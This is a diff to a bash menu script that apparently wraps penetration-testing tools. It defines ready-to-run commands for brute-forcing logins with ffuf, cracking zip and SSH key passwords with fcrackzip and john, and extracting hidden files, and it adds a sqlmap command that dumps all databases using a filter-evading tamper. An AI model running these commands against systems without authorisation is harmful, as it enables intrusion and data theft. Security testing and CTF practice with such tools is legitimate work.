@@ -51,6 +51,7 @@ COMMAND_b3='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key
 COMMAND_b4='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
 COMMAND_b5='python2 /usr/share/john/ssh2john.py id_rsa > key.hash'
 COMMAND_b6='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
+COMMAND_b7='sqlmap --dump-all --dbms=mysql --tamper=space2comment -r BURP_REQUEST_FFILE'
 
 COMMAND_d1='binwalk -e file.jpg'
 COMMAND_d2='steghide extract -sf file.jpg'
@@ -120,6 +121,7 @@ show_menus() {
   echo -e "  ${YELLOW}b4${NOCOLOR}) $COMMAND_b4"
   echo -e "  ${YELLOW}b5${NOCOLOR}) $COMMAND_b5"
   echo -e "  ${YELLOW}b6${NOCOLOR}) $COMMAND_b6"
+  echo -e "  ${YELLOW}b7${NOCOLOR}) $COMMAND_b7"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
   echo -e "  --------------------"
@@ -346,6 +348,7 @@ read_options() {
     b4) runV $COMMAND_b4;;
     b5) runV $COMMAND_b5;;
     b6) runV $COMMAND_b6;;
+    b7) runV $COMMAND_b7;;
 
     d1) runV $COMMAND_d1;;
     d2) runV $COMMAND_d2;;
